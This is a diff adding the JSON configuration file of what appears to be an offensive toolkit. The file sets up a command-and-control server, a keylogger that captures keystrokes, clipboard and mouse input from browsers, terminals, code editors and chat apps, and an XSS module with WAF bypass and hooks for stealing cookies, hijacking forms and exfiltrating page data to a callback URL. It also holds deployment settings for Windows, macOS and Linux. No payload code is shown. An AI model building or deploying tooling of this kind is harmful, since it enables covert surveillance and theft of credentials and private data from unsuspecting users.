@@ -1,0 +1,47 @@
+{
+  "c2": {
+    "host": "0.0.0.0",
+    "port": 8080,
+    "encryption_key": null,
+    "debug": false
+  },
+  "keylogger": {
+    "flush_interval": 30,
+    "max_buffer": 1000,
+    "capture_mouse": true,
+    "capture_clipboard": true,
+    "capture_screenshots": false,
+    "screenshot_interval": 60,
+    "target_apps": [
+      "chrome", "firefox", "edge", "safari", "brave", "opera",
+      "terminal", "cmd", "powershell", "bash", "zsh", "fish",
+      "code", "vim", "nvim", "notepad", "notepad++",
+      "discord", "slack", "teams", "telegram", "whatsapp",
+      "outlook", "thunderbird", "mail"
+    ],
+    "exclude_apps": []
+  },
+  "xss": {
+    "default_context": "HTML_BODY",
+    "waf_bypass": true,
+    "payload_count": 20,
+    "c2_callback_url": "http://localhost:8080/hook",
+    "hook_templates": {
+      "cookie_steal": true,
+      "keylogger": true,
+      "form_jack": true,
+      "dom_exfil": true,
+      "beef_hook": false
+    }
+  },
+  "deployment": {
+    "platforms": ["windows", "macos", "linux"],
+    "output_dir": "deploy",
+    "sign_binaries": false,
+    "obfuscate": false
+  },
+  "database": {
+    "path": "~/.c2_data/c2.db",
+    "backup_interval": 3600
+  }
+}
